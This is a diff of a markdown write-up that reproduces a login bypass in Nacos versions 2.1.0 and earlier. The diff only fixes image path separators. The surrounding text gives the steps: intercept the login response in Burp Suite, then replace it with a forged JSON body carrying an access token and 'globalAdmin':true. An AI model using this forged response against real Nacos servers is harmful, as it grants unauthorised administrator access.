@@ -10,11 +10,11 @@ Nacos <= 2.1.0 version
 
 Step 1：Go directly to Nacos website, fill in any user name and password and use Burpsuite to grab the bag.
 
-![login](img\login.png)
+![login](img/login.png)
 
 Step 2：Intercept the response packet.
 
-![response](img\response.png)
+![response](img/response.png)
 
 Step 3: Modify the data packet as follows
 
@@ -33,11 +33,11 @@ Server: elb
 {"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA","tokenTtl":18000,"globalAdmin":true}
 ```
 
-![new](img\new.png)
+![new](img/new.png)
 
 Step 4: Log in successfully after releasing the data packet.
 
-![success](img\success.png)
+![success](img/success.png)
 
 
 
